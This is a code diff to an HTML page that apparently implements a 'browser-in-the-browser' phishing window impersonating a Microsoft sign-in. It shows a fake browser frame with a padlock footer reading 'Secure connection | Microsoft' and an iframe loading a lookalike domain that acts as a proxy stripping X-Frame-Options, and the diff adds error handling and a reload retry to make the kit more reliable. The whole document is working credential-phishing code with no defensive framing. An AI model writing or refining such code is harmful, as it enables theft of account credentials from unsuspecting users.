@@ -37,6 +37,9 @@
             color: #1a1a1a;
             border: 1px solid #ddd;
             box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
         .browser-iframe {
             width: 100%;
@@ -66,6 +69,14 @@
             z-index: 9999;
         }
         .close-btn:hover { background: rgba(255,0,0,0.8); }
+        .error-msg {
+            padding: 20px;
+            text-align: center;
+            color: #d32f2f;
+            background: #ffebee;
+            border-radius: 8px;
+            margin: 20px;
+        }
     </style>
 </head>
 <body>
@@ -77,18 +88,42 @@
                 <span class="dot yellow"></span>
                 <span class="dot green"></span>
             </div>
-            <div class="browser-url" id="urlDisplay">https://login.microsoftonline.com/</div>
+            <div class="browser-url" id="urlDisplay">Loading...</div>
         </div>
         <iframe class="browser-iframe" id="bitbFrame" src="about:blank"></iframe>
         <div class="browser-footer">🔒 Secure connection | Microsoft</div>
     </div>
     <script>
-    const params = new URLSearchParams(window.location.search);
-    // ✅ FIX: Use the proxy URL instead of direct Microsoft
-    let targetUrl = params.get('url') || 'https://login.office-onmisoft.online/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
-    if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
-    document.getElementById('bitbFrame').src = targetUrl;
-    document.getElementById('urlDisplay').textContent = targetUrl;
-</script>
+        // ✅ FIX: Use the proxy URL so X-Frame-Options is stripped
+        const PROXY_URL = 'https://login.office-onmisoft.online/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
+        
+        const params = new URLSearchParams(window.location.search);
+        let targetUrl = params.get('url') || PROXY_URL;
+        
+        // If the URL is not a full URL, make it one
+        if (!targetUrl.startsWith('http')) {
+            targetUrl = 'https://' + targetUrl;
+        }
+        
+        // Display the URL
+        document.getElementById('urlDisplay').textContent = targetUrl;
+        
+        // Load the URL in the iframe
+        const iframe = document.getElementById('bitbFrame');
+        iframe.src = targetUrl;
+        
+        // Handle iframe load errors
+        iframe.onerror = function() {
+            document.getElementById('urlDisplay').textContent = '⚠️ Failed to load: ' + targetUrl;
+        };
+        
+        // Also try loading after a short delay (for CORS issues)
+        setTimeout(() => {
+            if (iframe.contentWindow === null) {
+                // Iframe didn't load, try reloading
+                iframe.src = targetUrl;
+            }
+        }, 2000);
+    </script>
 </body>
 </html>
